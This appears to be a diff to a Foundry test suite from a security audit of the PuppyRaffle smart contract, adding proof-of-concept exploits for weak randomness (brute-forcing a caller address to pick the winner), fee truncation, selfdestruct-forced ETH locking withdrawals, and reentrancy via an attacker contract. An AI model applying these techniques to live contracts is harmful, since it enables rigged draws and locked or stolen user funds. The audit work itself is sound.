@@ -2,6 +2,21 @@
 pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
 
+// @audit-info Test coverage is poor
+/*
+╭------------------------------+----------------+-----------------+----------------+----------------╮
+| File                         | % Lines        | % Statements    | % Branches     | % Funcs        |
++===================================================================================================+
+| script/DeployPuppyRaffle.sol | 0.00% (0/4)    | 0.00% (0/4)     | 100.00% (0/0)  | 0.00% (0/1)    |
+|------------------------------+----------------+-----------------+----------------+----------------|
+| src/PuppyRaffle.sol          | 85.33% (64/75) | 85.88% (73/85)  | 69.23% (18/26) | 80.00% (8/10)  |
+|------------------------------+----------------+-----------------+----------------+----------------|
+| test/PuppyRaffleTest.t.sol   | 88.24% (15/17) | 92.31% (12/13)  | 100.00% (1/1)  | 80.00% (4/5)   |
+|------------------------------+----------------+-----------------+----------------+----------------|
+| Total                        | 82.29% (79/96) | 83.33% (85/102) | 70.37% (19/27) | 75.00% (12/16) |
+╰------------------------------+----------------+-----------------+----------------+----------------╯
+*/
+
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 contract PuppyRaffleTest is Test {
@@ -213,6 +228,141 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
+    //////////////////////
+    /// PoCs (Audit)    ///
+    //////////////////////
+
+    function _findCallerForWinnerIndex(uint256 desiredIndex, uint256 playersLen)
+        internal
+        view
+        returns (address caller)
+    {
+        // Brute-force a sender address that yields the desired `winnerIndex`.
+        // This models an attacker deploying/using many EOAs/contracts.
+        for (uint256 i = 10; i < 5000; i++) {
+            address candidate = address(uint160(i));
+            uint256 idx =
+                uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % playersLen;
+            if (idx == desiredIndex) {
+                return candidate;
+            }
+        }
+        return address(0);
+    }
+
+    // @test_audit PoC Weak RNG (H-2)
+    function test_weakRngPoC() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        address caller = _findCallerForWinnerIndex(0, 4);
+        assertTrue(caller != address(0));
+
+        vm.prank(caller);
+        puppyRaffle.selectWinner();
+        assertEq(puppyRaffle.previousWinner(), playerOne);
+    }
+
+    // @test_audit PoC totalFees uint64 truncation DoS (M-2)
+    function test_totalFeesTruncationPoC() public {
+        uint256 playersNumber = 100;
+        address[] memory players = new address[](playersNumber);
+        for (uint256 i = 0; i < playersNumber; i++) {
+            players[i] = address(uint160(i + 10));
+        }
+
+        vm.deal(address(this), entranceFee * playersNumber);
+        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 contractBalance = address(puppyRaffle).balance;
+        uint256 reportedFees = uint256(puppyRaffle.totalFees());
+        assertTrue(contractBalance != reportedFees);
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    // @test_audit PoC forced ETH locks withdrawFees (M-3)
+    function test_forcedEthLocksWithdrawFeesPoC() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        ForceSend forceSend = new ForceSend{value: 1}();
+        forceSend.destroy(payable(address(puppyRaffle)));
+
+        assertEq(address(puppyRaffle).balance, uint256(puppyRaffle.totalFees()) + 1);
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    // @test_audit PoC enterRaffle empty array accepted (L-2)
+    function test_enterRaffleEmptyArrayPoC() public {
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
+
+        address[] memory empty = new address[](0);
+        puppyRaffle.enterRaffle{value: 0}(empty);
+
+        assertEq(puppyRaffle.players(0), playerOne);
+        assertEq(puppyRaffle.players(1), playerTwo);
+    }
+
+    // @test_audit PoC feeAddress can be zero (L-3)
+    function test_feeAddressZeroPoC() public {
+        PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(0), duration);
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+
+        vm.deal(address(this), entranceFee * 4);
+        raffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        raffle.selectWinner();
+
+        uint256 zeroBefore = address(0).balance;
+        uint256 expectedFees = ((entranceFee * 4) * 20) / 100;
+        raffle.withdrawFees();
+        assertEq(address(0).balance, zeroBefore + expectedFees);
+    }
+
+    // @test_audit PoC selectWinner reentrancy window (L-4)
+    function test_selectWinnerReentrancyPoC() public {
+        PrizeReenterer attacker = new PrizeReenterer(puppyRaffle);
+
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = address(attacker);
+
+        vm.deal(address(this), entranceFee * 4);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // Ensure the attacker is selected as winner (index 3)
+        address caller = _findCallerForWinnerIndex(3, 4);
+        assertTrue(caller != address(0));
+        vm.prank(caller);
+        puppyRaffle.selectWinner();
+
+        assertEq(puppyRaffle.previousWinner(), address(attacker));
+        // If reentrancy happened, attacker enrolled itself as the first player of the next round.
+        assertEq(puppyRaffle.players(0), address(attacker));
+    }
+
     // @test_audit PoC DoS attack
     function test_dnialOfService() public {
         // Let´s enter 100 players
@@ -371,5 +521,39 @@ contract ReentrancyAttacker {
 
     fallback() external payable {
         _stealMoney();
+    }
+}
+
+contract ForceSend {
+    constructor() payable {}
+
+    function destroy(address payable target) external {
+        selfdestruct(target);
+    }
+}
+
+contract PrizeReenterer {
+    PuppyRaffle private immutable raffle;
+    uint256 private immutable fee;
+    bool private didReenter;
+
+    constructor(PuppyRaffle _raffle) {
+        raffle = _raffle;
+        fee = _raffle.entranceFee();
+    }
+
+    receive() external payable {
+        if (didReenter) {
+            return;
+        }
+        didReenter = true;
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        raffle.enterRaffle{value: fee}(players);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        // IERC721Receiver.onERC721Received.selector
+        return 0x150b7a02;
     }
 }
